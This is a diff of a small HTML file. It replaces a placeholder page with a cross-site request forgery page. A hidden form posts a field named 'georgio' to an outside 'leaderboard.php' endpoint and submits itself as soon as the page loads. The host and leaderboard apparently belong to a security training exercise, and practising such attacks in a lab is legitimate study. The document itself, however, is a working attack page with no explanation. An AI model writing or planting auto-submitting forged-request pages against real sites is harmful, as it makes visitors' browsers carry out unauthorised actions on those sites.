@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-    
-<title>Embed PHP in a .html File</title>
-</head>
-<body>
-<form action="file.php">
-</form>
-</body>
+    <body>
+        <form action="https://xss.uqcloud.net/leaderboard.php" method="POST">
+            <input name="georgio"/>
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
 </html>
